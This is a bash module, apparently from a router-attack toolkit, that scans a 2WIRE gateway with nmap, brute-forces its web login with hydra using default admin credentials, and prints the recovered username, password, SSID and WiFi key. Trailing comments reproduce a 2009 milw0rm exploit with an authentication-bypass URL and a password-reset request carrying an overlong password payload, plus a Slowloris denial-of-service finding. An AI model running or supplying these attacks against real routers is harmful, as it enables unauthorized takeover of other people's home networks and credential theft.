#!/bin/bash

# 2WIRE Module


nmap_output="/tmp/menu/router.tmp"
gateway=$1
interface=$2
user=""

mkdir /tmp/menu

function display() {                                                                          # Make It Pretty
      output=""
      if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ]; then
         if [ "$1" == "action" ]; then output="[>]"
         elif [ "$1" == "info" ]; then output="[i]"
         elif [ "$1" == "diag" ]; then output="[+]"
         elif [ "$1" == "error" ]; then output="[!]"
         fi
      fi
}

# user=$(sed -n '1p' < /tmp/menu/router_pass1)
# pass=$(sed -n '2p' < /tmp/menu/router_pass1)
# ssid=$(sed -n '3p' < /tmp/menu/router_pass1)
# wifi_key=$(sed -n '5p' < /tmp/menu/router_pass1)

# Brute Force Attempt
if [ "$pass" == "" ] ; then
   nmap -oN $nmap_output -p80,443 $gateway -e $interface
   brute_port=$(grep open $nmap_output | head -n 1 | awk '{ print $3 }')                       # | sed 's/\/tcp//g')
   hydra -o /tmp/menu/pass -l admin -p admin $gateway $brute_port-get                        # Hydra isn/t working on 2WIRE? Try Default Password
   user=$(cat /tmp/menu/pass | sed 's/.*login: \(.*\)   password.*/\1/')                              # Get Username
   pass=$(cat /tmp/menu/pass | awk 'match($0,"password: "){print substr($0,RSTART+10,100)}')          # Get password

   if [ "$pass" == "" ] ; then
      # Full NMap Scan on Router
      nmap -O -sS -T4 -p1-65535 $gateway
   fi
fi

display info "Username      =  \e[01;33m$user\e[00m" > /tmp/menu/router_pass
display info "Password      =  \e[01;33m$pass\e[00m" >> /tmp/menu/router_pass
display info "SSID          =  \e[01;33m$ssid\e[00m" >> /tmp/menu/router_pass
display info "WiFi Key      =  \e[01;33m$wifi_key\e[00m" >> /tmp/menu/router_pass
cat /tmp/menu/router_pass
exit

#__ Known Vulnerable ______________________________________________________________________________

# | http-slowloris-check: 
# |   VULNERABLE:
# |   Slowloris DOS attack
# |     State: VULNERABLE
# |     Description:
# |       Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
# |       It accomplishes this by opening connections to the target web server and sending a partial request. By doing 
# |       so, it starves the http server's resources causing Denial Of Service. 
# |       		
# |     Disclosure date: 2009-09-17
# |     References:
# |_      http://ha.ckers.org/slowloris/

# 2WIRE GATEWAY AUTHENTICATION BYPASS & PASSWORD RESET (08/04/09)
# ==============================================================
#  
#  
#   EXPLOIT/POC
# -----------------
# Authentication Bypass - just use this page to set a new password
#  
#     http://gateway.2wire.net?xslt?page=CD35_SETUP_01
#  
# Video: http://www.hakim.ws/2wire/2wire_CD35_Bypass.ogv
#  
#  
# Password Reset - using the same form but sending a password > 512 characters
#  
# http://gateway.2wire.net/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkm
# hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
# kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
# mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
# hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
# kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
# mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkh
# kmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
# hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
# kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
# mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkm
# hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmh
# kmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhk
# mhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm
#  
# Video: http://www.hakim.ws/2wire/2wire_CD35_Reset.ogv
#  
#  
#   GREETS
# ------------
# sdc lightos pcp nitr0us 0xf alt3kx darko DeadSector Etal gwolf h4ckult1m4t3
# hackerss hd k00l kaz Kbrown mendozaaaa nahual Napa nediam raza-mexicana roa
# Setting sla.ckers thornmaker tr3w vandida vi0let xianur0 Yield
#  
#   Comunidad Underground de Mexico : https://www.underground.org.mx
#  
#  
#             h k m
#      http://www.hakim.ws
#  
# # milw0rm.com [2009-08-12]